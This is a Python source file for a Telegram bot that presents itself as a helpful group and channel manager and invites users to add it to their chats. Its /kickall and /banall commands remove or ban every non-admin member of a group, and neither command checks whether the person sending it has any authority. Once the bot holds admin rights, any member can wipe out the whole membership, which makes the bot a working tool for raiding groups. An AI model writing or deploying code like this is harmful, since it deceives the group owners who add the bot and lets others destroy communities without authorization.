import logging
import random
import os
import sys
import asyncio
import time
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import LeaveChannelRequest, EditBannedRequest
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChannelParticipantsKicked
from telethon.errors.rpcerrorlist import FloodWaitError
from config import Var

# Logging
logging.basicConfig(level=logging.INFO)
print("Starting...")

# Initialize Bot
Dil = TelegramClient('Dil', Var.API_ID, Var.API_HASH).start(bot_token=Var.BOT_TOKEN)

# Restricted Rights
RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

# Emojis
EMOJIS = ["🥰", "❤️", "😁", "💋", "😱", "🤣", "😘", "❤️‍🔥", "👌", "🫡", "😍"]

# Start Command
@Dil.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    bot_info = await event.client.get_me()
    first_name = event.sender.first_name
    random_emoji = random.choice(EMOJIS)

    await event.respond(
        f"➻ 𝗛𝗲𝘆, {first_name} {random_emoji}\n\n"
        "🥀 𝗜 𝗮𝗺 𝗮𝗻 𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 & 𝗛𝗶𝗴𝗵-𝗤𝘂𝗮𝗹𝗶𝘁𝘆 𝗥𝗼𝗯𝗼𝘁.\n"
        "🌿 𝗜 𝗰𝗮𝗻 𝗵𝗲𝗹𝗽 𝘆𝗼𝘂 𝗺𝗮𝗻𝗮𝗴𝗲 𝘆𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗼𝗿 𝗴𝗿𝗼𝘂𝗽𝘀.\n\n"
        "🐬 𝗧𝗮𝗽 𝗼𝗻 ❥ 𝗛𝗲𝗹𝗽 & 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗯𝘂𝘁𝘁𝗼𝗻\n"
        "🦋 𝗧𝗼 𝗲𝘅𝗽𝗹𝗼𝗿𝗲 𝗺𝘆 𝗺𝗼𝗱𝘂𝗹𝗲𝘀 & 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀.\n\n"
        "💐 𝗙𝗲𝗲𝗹 𝗳𝗿𝗲𝗲 𝘁𝗼 𝘂𝘀𝗲 𝗺𝗲 𝗮𝗻𝗱 𝘀𝗵𝗮𝗿𝗲 𝘄𝗶𝘁𝗵 𝘆𝗼𝘂𝗿 𝗳𝗿𝗶𝗲𝗻𝗱𝘀!",
        buttons=[
            [Button.url("➕ 𝗔𝗱𝗱 𝗠𝗲 𝗧𝗼 𝗬𝗼𝘂𝗿 𝗖𝗵𝗮𝘁 ➕", "https://t.me/TaitanXBot")],
            [Button.url("🧠 𝗛𝗲𝗹𝗽 & 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 🧠", "https://t.me/TaitanXBot")]
        ]
    )

    await event.respond(file="https://graph.org/file/8363b1024b533cf062e65-06257ce831d003ddab.jpg")

# Ping Command
@Dil.on(events.NewMessage(pattern="^/ping"))
async def ping(e):
    start = datetime.now()
    event = await e.reply("Pong!")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f"**I'm On** \n\n __Pong__ !! `{ms}` ms")

# Kick All Command
@Dil.on(events.NewMessage(pattern="^/kickall"))
async def kickall(event):
    if not event.is_group:
        return await event.reply("This command only works in groups!")

    chat = await event.get_chat()
    admins = [admin.id for admin in await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)]
    kicked_count = 0

    async for user in event.client.iter_participants(event.chat_id):
        if user.id not in admins:
            try:
                await event.client.kick_participant(event.chat_id, user.id)
                kicked_count += 1
                await asyncio.sleep(0.1)
            except Exception:
                pass

    await event.reply(f"✅ Successfully kicked {kicked_count} users.")

# Ban All Command
@Dil.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
    if not event.is_group:
        return await event.reply("This command only works in groups!")

    chat = await event.get_chat()
    admins = [admin.id for admin in await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)]
    banned_count = 0

    async for user in event.client.iter_participants(event.chat_id):
        if user.id not in admins:
            try:
                await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                banned_count += 1
                await asyncio.sleep(0.1)
            except Exception:
                pass

    await event.reply(f"✅ Successfully banned {banned_count} users.")

# Unban All Command
@Dil.on(events.NewMessage(pattern="^/unbanall"))
async def unban(event):
    if not event.is_group:
        return await event.reply("This command only works in groups!")

    unbanned_count = 0
    async for user in event.client.iter_participants(event.chat_id, filter=ChannelParticipantsKicked):
        try:
            await event.client(EditBannedRequest(event.chat_id, user.id, ChatBannedRights(until_date=0, view_messages=False)))
            unbanned_count += 1
        except Exception:
            pass

    await event.reply(f"✅ Successfully unbanned {unbanned_count} users.")

# Leave Command
@Dil.on(events.NewMessage(pattern="^/leave"))
async def leave(e):
    if e.sender_id not in Var.SUDO:
        return

    chat_id = e.chat_id
    try:
        await e.client(LeaveChannelRequest(chat_id))
        await e.reply("✅ Successfully left the chat.")
    except Exception as err:
        await e.reply(f"❌ Error: {err}")

# Restart Command
@Dil.on(events.NewMessage(pattern="^/restart"))
async def restart(e):
    if e.sender_id not in Var.SUDO:
        return

    await e.reply("🔄 Restarting...")
    try:
        await Dil.disconnect()
    except Exception:
        pass
    os.execl(sys.executable, sys.executable, *sys.argv)
    sys.exit()

# Run Bot
print("\n\nBot started successfully ✅")
Dil.run_until_disconnected()
